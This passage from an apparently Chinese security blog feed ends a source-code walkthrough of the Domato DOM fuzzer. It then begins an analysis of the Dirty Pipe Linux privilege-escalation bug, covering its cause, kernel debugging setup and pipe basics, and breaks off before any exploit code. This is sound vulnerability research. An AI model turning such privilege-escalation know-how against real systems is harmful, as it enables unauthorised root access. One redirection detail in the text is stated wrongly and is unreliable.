class="string">&#x27;lines&#x27;</span>].append(filed_rule)</span><br><span class="line">        context[<span class="string">&#x27;lines&#x27;</span>].extend(additional_lines)</span><br><span class="line">        <span class="keyword">if</span> symbol == <span class="string">&#x27;line&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> filed_rule</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> ret_vars[random.randint(<span class="number">0</span>, <span class="built_in">len</span>(ret_vars) - <span class="number">1</span>)]</span><br></pre></td></tr></table></figure><p><img src="/2022/04/14/domato101/image-20220119112246373.png" alt="image-20220119112246373"></p><h4 id="generate-code"><a href="#generate-code" class="headerlink" title="_generate_code"></a>_generate_code</h4><h5 id="generate-code-1"><a href="#generate-code-1" class="headerlink" title="_generate_code"></a>_generate_code</h5><p>调用了<code>_add_variable</code>，<code>_expand_rule</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_generate_code</span>(<span class="params">self, num_lines, initial_variables=[], last_var=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generates a given number of lines of code.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">&#x27;lastvar&#x27;</span>: last_var,</span><br><span class="line">        <span class="string">&#x27;lines&#x27;</span>: [],</span><br><span class="line">        <span class="string">&#x27;variables&#x27;</span>: &#123;&#125;,</span><br><span class="line">        <span class="string">&#x27;interesting_lines&#x27;</span>: [],</span><br><span class="line">        <span class="string">&#x27;force_var_reuse&#x27;</span>: <span class="literal">False</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> initial_variables:</span><br><span class="line">        self._add_variable(v[<span class="string">&#x27;name&#x27;</span>], v[<span class="string">&#x27;type&#x27;</span>], context)</span><br><span class="line">    self._add_variable(<span class="string">&#x27;document&#x27;</span>, <span class="string">&#x27;Document&#x27;</span>, context)</span><br><span class="line">    self._add_variable(<span class="string">&#x27;window&#x27;</span>, <span class="string">&#x27;Window&#x27;</span>, context)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(context[<span class="string">&#x27;lines&#x27;</span>]) &lt; num_lines:</span><br><span class="line">        tmp_context = context.copy()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> (random.random() &lt; self._interesting_line_prob) <span class="keyword">and</span> (<span class="built_in">len</span>(tmp_context[<span class="string">&#x27;interesting_lines&#x27;</span>]) &gt; <span class="number">0</span>):</span><br><span class="line">                tmp_context[<span class="string">&#x27;force_var_reuse&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">                lineno = random.choice(tmp_context[<span class="string">&#x27;interesting_lines&#x27;</span>])</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                lineno = random.choice(self._all_nonhelper_lines)</span><br><span class="line">            creator = self._creators[<span class="string">&#x27;line&#x27;</span>][lineno]</span><br><span class="line">            self._expand_rule(<span class="string">&#x27;line&#x27;</span>, creator, tmp_context, <span class="number">0</span>, <span class="literal">False</span>)</span><br><span class="line">            context = tmp_context</span><br><span class="line">        <span class="keyword">except</span> RecursionError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;Warning: &#x27;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> self._line_guard:</span><br><span class="line">        guarded_lines = context[<span class="string">&#x27;lines&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        guarded_lines = []</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> context[<span class="string">&#x27;lines&#x27;</span>]:</span><br><span class="line">            guarded_lines.append(self._line_guard.replace(<span class="string">&#x27;&lt;line&gt;&#x27;</span>, line))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join(guarded_lines)</span><br></pre></td></tr></table></figure><h5 id="add-variable"><a href="#add-variable" class="headerlink" title="_add_variable"></a>_add_variable</h5><p>更新<code>_interesting_lines</code>，更新context[‘variables’][var_type]，递归处理<code>self._inheritance[var_type]</code>的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_add_variable</span>(<span class="params">self, var_name, var_type, context</span>):</span></span><br><span class="line">    <span class="keyword">if</span> var_type <span class="keyword">not</span> <span class="keyword">in</span> context[<span class="string">&#x27;variables&#x27;</span>]:</span><br><span class="line">        context[<span class="string">&#x27;variables&#x27;</span>][var_type] = []</span><br><span class="line">        <span class="keyword">if</span> var_type <span class="keyword">in</span> self._interesting_lines:</span><br><span class="line">            set1 = <span class="built_in">set</span>(context[<span class="string">&#x27;interesting_lines&#x27;</span>])</span><br><span class="line">            set2 = <span class="built_in">set</span>(self._interesting_lines[var_type])</span><br><span class="line">            new_interesting = set2 - set1</span><br><span class="line">            context[<span class="string">&#x27;interesting_lines&#x27;</span>] += <span class="built_in">list</span>(new_interesting)</span><br><span class="line">    context[<span class="string">&#x27;variables&#x27;</span>][var_type].append(var_name)</span><br><span class="line">    <span class="keyword">if</span> var_type <span class="keyword">in</span> self._inheritance:</span><br><span class="line">        <span class="keyword">for</span> parent_type <span class="keyword">in</span> self._inheritance[var_type]:</span><br><span class="line">            self._add_variable(var_name, parent_type, context)</span><br></pre></td></tr></table></figure><h5 id="expand-rule-1"><a href="#expand-rule-1" class="headerlink" title="_expand_rule"></a>_expand_rule</h5><p>该函数上面提到过，不多说了。</p><p><img src="/2022/04/14/domato101/image-20220119171957132.png" alt="image-20220119171957132"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，domato是一python开发的基于生成的DOM fuzzer。其核心在于给定语法规则生成随机的html文件。严格来说它并没有实现喂数据并检测崩溃的功能，可以把它当作一个生成器。</p><p>domato有两个主要的功能py文件 generator.py 和 grammar.py ，generator.py相当于外壳文件，用于初始化模板文件，并将生成的数据进行处理，最终生成一个样本文件；grammar.py 则相当于一个随机生成前端代码的库，通过读取特定的语法规则，来随机生成html，css，js代码，而这个语法文件通过txt文件进行维护，我们可以随时向语法文件添加新的特性来支持工具生成最新语法特性的代码。</p><p>该工具简单易用，可以方便对pdf js引擎，浏览器，js语法引擎等等场景进行fuzz，在问世之初便拿到很多CVE.</p><p>但是该工具最大的弊端在于没有与基于代码覆盖率引导的技术相结合，导致数据只是漫无目的生成，发现漏洞的随机性比较高，但是和代码覆盖引导结合有些问题</p><ol><li>由于大的样本会对fuzz效率产生比较大的影响，所以在传统的基于覆盖引导技术的fuzz过程中一般会对样本进行精简（也就是语料库蒸馏），一般domato生成的html文件比较大，而拿afl-tmin来说处理一个大文件的时间是很长的，而成百上千的大文件语料库蒸馏就是一个比较大的问题，如何在保证语料库蒸馏效果的基础上提高语料库蒸馏的效率。而不至于语料库蒸馏的时间比真正fuzz的时间还要更长。</li><li>由于domato只实现了生成语料库的功能，我们需要自行实现自动化漏洞类型识别，挂机重启，数据处理，日志处理等等问题。</li><li>上面提到了语料库蒸馏的问题，还有关键的问题在于基于覆盖引导的dom fuzzer怎样实现，作者之前实现了该功能，但是效果并不理想，可见需要正确的编码和思想才可以充分利用基于覆盖引导的优势，否则只会适得其反。</li></ol><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol><li><a class="link"   href="https://github.com/googleprojectzero/domato" >官方github<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://googleprojectzero.blogspot.com/2017/09/the-great-dom-fuzz-off-of-2017.html" >官方blog<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.skylined.nl/20181017001.html" >damato配合bugid自动化进行fuzz与分类<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://symeonp.github.io/2020/04/18/grammar-based-fuzzing.html" >使用domato对pdf解析阅读器进行fuzz<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://sigpwn.io/blog/2018/5/13/adding-afl-bloom-filter-to-domato-for-fun" >将 AFL 布隆过滤器添加到 Domato 以获得更多崩溃<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://sigpwn.io/blog/2018/4/14/domato-fuzzers-generation-engine-internals" >Domato Fuzzer 的生成引擎内部结构<i class="fas fa-external-link-alt"></i></a></li><li><a class="link"   href="https://blog.jmpesp.org/2020/01/fuzzing-php-with-domato.html?m=1&fbclid=IwAR16VPIISd2dERbma9o5bmYrEo-iBS7gPhsr0UqjUJWLlctWiHO1zpmPjHg" >使用Domato去fuzz php解析引擎<i class="fas fa-external-link-alt"></i></a></li></ol><h2 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h2><ol><li>将AFL布隆过滤器与domato结合</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Domato101&quot;&gt;&lt;a href=&quot;#Domato101&quot; class=&quot;headerlink&quot; title=&quot;Domato101&quot;&gt;&lt;/a&gt;Domato101&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="101" scheme="https://fa1lr4in.github.io/categories/101/"/>
    
    
    <category term="浏览器" scheme="https://fa1lr4in.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    <category term="fuzz" scheme="https://fa1lr4in.github.io/tags/fuzz/"/>
    
    <category term="源码分析" scheme="https://fa1lr4in.github.io/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析</title>
    <link href="https://fa1lr4in.github.io/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://fa1lr4in.github.io/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2022-03-30T03:46:57.000Z</published>
    <updated>2022-04-19T09:12:57.965Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2022-0847-dirtypipe-linux本地提权全网第二详细漏洞分析"><a href="#CVE-2022-0847-dirtypipe-linux本地提权全网第二详细漏洞分析" class="headerlink" title="CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析"></a>CVE-2022-0847 dirtypipe linux本地提权全网第二详细漏洞分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CVE-2022-0847 于 2022-03-07 公开披露，该漏洞的大概原理为<code>splice</code>系统调用由于未初始化某buf，可能包含旧的<code>PIPE_BUF_FLAG_CAN_MERGE</code>，导致可以通过管道越界写，覆盖关键文件如<code>/etc/passwd</code>可达到提权的效果。因漏洞类型和“DirtyCow”（脏牛）类似，发现者 Max Kellermann 研究员将该漏洞命名为 Dirty Pipe</p><p>从漏洞作者的博客可以得知，作者并非从事于漏洞挖掘相关的工作，而是由于关注到了日志文件的CRC校验和与文件大小标志位出现了错误。大小正好为8个字节，作者经过长时间的排查验证发现这八个字节为ZIP头。</p><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220315174946244.png" alt="image-20220315174946244"></p><p>经过<code>检查zlib及项目相关库</code>-&gt;<code>发现bug出现在月末</code>-&gt;<code>审查web代码</code>-&gt;<code>定位linux内核代码</code>这一套复杂的流程发现了linux pipe存在安全隐患，最终编写出利用代码并提交给社区。这种精神是安全研究者必备的品质。respect！</p><p>参考了国内的师傅们所公开的分析文章，大概了解漏洞原理后，开始正式分析。</p><p>前置知识非必须，实力较强的师傅可以直接看漏洞分析部分。</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="一、linux内核调试环境编译"><a href="#一、linux内核调试环境编译" class="headerlink" title="一、linux内核调试环境编译"></a>一、linux内核调试环境编译</h3><p>主要参考了<a class="link"   href="https://cloud.tencent.com/developer/article/1643968" >该文章<i class="fas fa-external-link-alt"></i></a>与<a class="link"   href="https://www.binss.me/blog/how-to-debug-linux-kernel/" >该文章<i class="fas fa-external-link-alt"></i></a>，我使用了5.11.1版本的linux</p><h4 id="1、源码获取"><a href="#1、源码获取" class="headerlink" title="1、源码获取"></a>1、源码获取</h4><p>首先拖源码（这里也可以下载其他版本）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.11.1.tar.gz</span><br><span class="line">tar zxvf linux-5.11.1.tar.gz</span><br></pre></td></tr></table></figure><p>或者使用官方github</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/torvalds/linux.git</span><br><span class="line">git checkout xxxx</span><br></pre></td></tr></table></figure><p>我采用的是第一种方式</p><h4 id="2、内核编译"><a href="#2、内核编译" class="headerlink" title="2、内核编译"></a>2、内核编译</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.11.1</span><br><span class="line">make x86_64_defconfig   <span class="comment"># 加载默认config</span></span><br><span class="line">make menuconfig<span class="comment"># 自定义config</span></span><br></pre></td></tr></table></figure><p>要进行打断点调试，需要关闭系统的随机化和开启调试信息：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Processor type and features  ---&gt; </span><br><span class="line">    [ ] Build a relocatable kernel                                               </span><br><span class="line">        [ ]  Randomize the address <span class="keyword">of</span> the kernel image (KASLR) (NEW) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Kernel hacking  ---&gt;</span><br><span class="line">    Compile-time checks and compiler options  ---&gt;  </span><br><span class="line">        [*] Compile the kernel <span class="keyword">with</span> debug info                                                                  </span><br><span class="line">        [ ]   Reduce debugging information                                                                      </span><br><span class="line">        [ ]   Produce split debuginfo <span class="keyword">in</span> .dwo files                                                             </span><br><span class="line">        [*]   Generate dwarf4 debuginfo                                         </span><br><span class="line">        [*]   Provide GDB scripts <span class="keyword">for</span> kernel debugging</span><br></pre></td></tr></table></figure><p>之后进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make -j8</span><br></pre></td></tr></table></figure><h4 id="3、加载文件系统镜像"><a href="#3、加载文件系统镜像" class="headerlink" title="3、加载文件系统镜像"></a>3、加载文件系统镜像</h4><p>这里可以使用<code>syzkaller</code>的生成脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.11.1</span><br><span class="line">sudo apt-get install debootstrap</span><br><span class="line">wget https://github.com/google/syzkaller/blob/master/tools/create-image.sh -O create-image.sh<span class="comment"># 这里我得到的是一个html页面，最终笔者自行访问页面复制了相关的代码。</span></span><br><span class="line">chmod +x create-image.sh</span><br><span class="line">./create-image.sh<span class="comment"># 这里会在当前目录生成 stretch.img</span></span><br></pre></td></tr></table></figure><h4 id="4、启动qemu"><a href="#4、启动qemu" class="headerlink" title="4、启动qemu"></a>4、启动qemu</h4><p>这里的<code>-nographic</code>以及<code>-s</code>一定要加，执行命令后会启动生成的linux系统，并得到一个shell，这里可以不指定-net参数，默认会有一个NAT的网络，可以访问外网。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.11.1</span><br><span class="line">sudo qemu-system-x86_64 \</span><br><span class="line">-s \</span><br><span class="line">    -m 2G \</span><br><span class="line">    -smp 2 \</span><br><span class="line">    -kernel ./arch/x86/boot/bzImage \</span><br><span class="line">    -append <span class="string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial&quot;</span>\</span><br><span class="line">    -drive file=./stretch.img,format=raw \</span><br><span class="line">    -nographic \</span><br><span class="line">    -pidfile vm.pid \</span><br><span class="line">    2&gt;&amp;1 | tee vm.log</span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220316173537546.png" alt="image-20220316173537546"></p><p>命令行参数如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-s              shorthand <span class="keyword">for</span> -gdb tcp::1234</span><br><span class="line">-append cmdline use <span class="string">&#x27;cmdline&#x27;</span> as kernel <span class="built_in">command</span> line</span><br><span class="line">-net nic[,macaddr=mac][,model=<span class="built_in">type</span>][,name=str][,addr=str][,vectors=v]</span><br><span class="line">                configure or create an on-board (or machine default) NIC and</span><br><span class="line">                connect it to hub 0 (please use -nic unless you need a hub) </span><br><span class="line">-enable-kvm 开启kvm，这里不要加，否则调试时会直接跳转到__sysvec_apic_timer_interrupt</span><br></pre></td></tr></table></figure><h4 id="5、gdb调试"><a href="#5、gdb调试" class="headerlink" title="5、gdb调试"></a>5、gdb调试</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> linux-5.11.1</span><br><span class="line">gdb vmlinux</span><br><span class="line">gef➤  target remote:1234<span class="comment"># 连接到远程调试接口</span></span><br><span class="line"><span class="comment"># 后面就可以正常进行调试了</span></span><br></pre></td></tr></table></figure><p><img src="/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220316174104667.png" alt="image-20220316174104667"></p><h3 id="二、标准输入输出、输入输出重定向、管道"><a href="#二、标准输入输出、输入输出重定向、管道" class="headerlink" title="二、标准输入输出、输入输出重定向、管道"></a>二、标准输入输出、输入输出重定向、管道</h3><h4 id="1、标准输入输出"><a href="#1、标准输入输出" class="headerlink" title="1、标准输入输出"></a>1、标准输入输出</h4><p>执行一个shell命令行时通常会自动打开三个标准文件，即标准输入文件<code>stdin</code>，通常对应终端的键盘；标准输出文件<code>stdout</code>和标准错误输出文件<code>stderr</code>，这两个文件都对应终端的屏幕。进程将从标准输入文件中得到输入数据，将正常输出数据输出]到标准输出文件，而将错误信息送到标准错误文件中。</p><p>举两个栗子</p><p>这里的文件描述符要注意里面的信息流</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test1.c将AAAAA送入标准输出，标准输出通过管道传递给wc命令得到字符数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">1</span>,<span class="string">&quot;AAAAA&quot;</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./test1</span></span><br><span class="line">AAAAA</span><br><span class="line"><span class="comment">// ./test1 | wc -c</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// test2.c 将AAAAA送入标准输入，wc -c没有从标准输出得到输入</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="built_in">write</span>(<span class="number">0</span>,<span class="string">&quot;AAAAA&quot;</span>,<span class="number">5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ./test1</span></span><br><span class="line">AAAAA</span><br><span class="line"><span class="comment">// ./test1 | wc -c</span></span><br><span class="line">AAAAA0</span><br></pre></td></tr></table></figure><h4 id="2、输入输出重定向"><a href="#2、输入输出重定向" class="headerlink" title="2、输入输出重定向"></a>2、输入输出重定向</h4><p><strong>输入重定向</strong>是指把命令（或可执行程序）的标准输入重定向到指定的文件中。也就是说，输入可以不来自键盘，而来自一个指定的文件。</p><p>如果给出一个文件名作为wc命令的参数，如下例所示，wc将返回该文件所包含的行数、单词数和字符数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wc /etc/passwd</span></span><br><span class="line">  50   87 2933 /etc/passwd</span><br></pre></td></tr></table></figure><p>另一种把/etc/passwd文件内容传给wc命令的方法是重定向wc的输入。输入重定向的一般形式为：命令&lt;文件名。可以用下面的命令把wc命令的输入重定向为/etc/passwd文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wc &lt; /etc/passwd</span></span><br><span class="line">  50   87 2933</span><br></pre></td></tr></table></figure><p>另一种输入重定向称为here文档，它告诉shell当前命令的标准输入来自命令行。here文档的重定向操作符使用&lt;&lt;。它将一对分隔符（本例中用delim表示）之间的正文重定向输入给命令。下例将一对分隔符delim之间的正文作为wc命令的输入，统计出正文的行数、单词数和字符数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wc &lt;&lt; delim</span></span><br><span class="line">\&gt;this text forms the content</span><br><span class="line">\&gt;of the here document,<span class="built_in">which</span></span><br><span class="line">\&gt;continues until the end of</span><br><span class="line">\&gt;text delimter</span><br><span class="line">\&gt;delim</span><br><span class="line"></span><br><span class="line">4 17 98</span><br></pre></td></tr></table></figure><p><strong>输出重定向</strong>是指把命令（或可执行程序）的标准输出或标准错误输出重新定向到指定文件中。这样，该命令的输出就不显示在屏幕上，而是写入到指定文件中。</p><p>输出重定向比输入重定向更常用，很多情况下都可以使用这种功能。例如，如果某个命令的输出很多，在屏幕上不能完全显示，那么将输出重定向到一个文件中，然后再用文本编辑器打开这个文件，就可以查看输出信息；如果想保存一个命令的输出，也可以使用这种方法。</p><p>输出重定向的一般形式为：命令&gt;文件名。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &gt; out</span><br></pre></td></tr></table></figure><p>这里将ls命令的输出写入到out文件中，注意这里的写入是覆盖写入，如果想得到追加写入的效果，可以使用<code>&lt;&lt;</code>.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &gt;&gt; out</span><br></pre></td></tr></table></figure><p>和程序的标准输出重定向一样，程序的错误输出也可以重新定向。使用符号2&gt;（或追加符号2&gt;&gt;）表示对错误输出设备重定向。例如下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls 2&gt; error</span><br><span class="line">ls 2&gt;&gt; error</span><br></pre></td></tr></table></figure><p>可在屏幕上看到程序的正常输出结果，但又将程序的任何错误信息送到文件err.file中，以备将来检查用。</p><p>还可以使用另一个输出重定向操作符（&amp;&gt;）将标准输出和错误输出同时送到同一文件中。例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &amp;&gt; error</span><br></pre></td></tr></table></figure><p>利用重定向将命令组合在一起，可实现系统单个命令不能提供的新功能。例如使用下面的命令序列：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls /usr/bin &gt; /tmp/dir</span></span><br><span class="line"><span class="comment"># wc -w &lt; /tmp/dir</span></span><br><span class="line">459</span><br></pre></td></tr></table></figure><p>统计了/usr/bin目录下的文件个数。</p><h4 id="3、管道"><a href="#3、管道" class="headerlink" title="3、管道"></a>3、管道</h4><p>将一个程序或命令的输出作为另一个程序或命令的输入，有两种方法，一种是通过一个临时文件将两个命令或程序结合在一起，例如上个例子中的/tmp/dir文件将ls和wc命令联在一起；另一种是Linux所提供的管道功能。这种方法比前一种方法更好。</p><p>管道可以把一系列命令连接起来，这意味着第一个命令的输出会作为第二个命令的输入通过管道传给第二个命令，第二个命令的输出又会作为第三个命令的输入，以此类推。显示在屏幕上的是管道行中最后一个命令的输出（如果命令行中未使用输出重定向）。</p><p>通过使用管道符“|”来建立一个管道行。用管道重写上面的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ls /usr/bin|wc -w</span></span><br><span class="line">1789</span><br></pre></td></tr></table></figure><p>管道与重定向的简单区别在于，重定向将命令与文件连接起来，而管道符将命令与命令连接起来。</p><p><strong>管道是进程间通信的主要手段之一。一个管道实际上就是个只存在于内存中的文件，</strong></p><p><strong>对这个文件的操作要通过两个已经打开文件进行，它们分别代表管道的两端。管道是一种特殊的文件，它不属于某一种文件系统，而是一种独立的文件系统，有其自己的数据结构。根据管道的适用范围将其分为：无名管道和命名管道。</strong></p><p>管道是由内核管理的一个缓冲区，相当于我们放入内存中的一个纸条。管道的一端连接一个进程的输出。这个进程会向管道中放入信息。管道的另一端连接一个进程的输入，这个进程取出被放入管道的信息。一个缓冲区不需要很大一般为4K大小，它被设计成为环形的数据结构，以便管道可以被循环利用。当管道中没有信息的话，从管道中读取的进程会等待，直到另一端的进程放入信息。当管道被放满信息的时候，尝试放入信息的进程会等待，直到另一端的进程取出信息。当两个进程都终结的时候，管道也自动消失。</p><h3 id="三、管道源代码实现"><a href="#三、管道源代码实现" class="headerlink" title="三、管道源代码实现"></a>三、管道源代码实现</h3><h4 id="0、前言"><a href="#0、前言" class="headerlink" title="0、前言"></a>0、前言</h4><p>代码部分使用了linux 